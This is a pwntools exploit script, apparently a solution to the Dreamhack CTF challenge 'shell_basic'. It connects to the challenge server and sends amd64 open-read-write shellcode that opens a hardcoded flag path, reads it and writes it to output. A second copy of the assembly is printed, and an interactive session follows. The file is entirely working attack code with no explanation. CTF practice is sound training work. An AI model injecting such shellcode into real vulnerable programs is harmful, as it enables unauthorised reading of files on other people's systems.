from pwn import process, remote, shellcraft, context, asm
from utils import hexcode_to_asm, string_to_hexcode 
from os import getcwd

REMOTE = True
context.log_level = "debug"

if REMOTE:
  r = remote("host3.dreamhack.games",16633)
else:
  r = process(f"fish -c '{getcwd()}/a/shell_basic'", shell=True)

r.recvuntil(b":")
r.send(asm(f'''
{hexcode_to_asm(string_to_hexcode('/home/shell_basic/flag_name_is_loooooong'))}
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x02
syscall
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall
mov rdi, 1
mov rax, 0x1
syscall
''', arch="amd64", os="linux"))
print('''
push 0x0
mov rax, 0x676e6f6f6f6f6f6f
 push rax
 mov rax, 0x6c5f73695f656d61
 push rax
 mov rax, 0x6e5f67616c662f63
 push rax
 mov rax, 0x697361625f6c6c65
 push rax
 mov rax, 0x68732f656d6f682f
 push rax
 mov rdi, rsp
 xor rsi, rsi
 xor rdx, rdx
 mov rax, 0x02
 syscall

 mov rdi, rax
 mov rsi, rsp
 sub rsi, 0x30
 mov rdx, 0x30
 mov rax, 0x0
 syscall

 mov rdi, 1
 mov rax, 0x1
 syscall
 ''')
r.interactive()

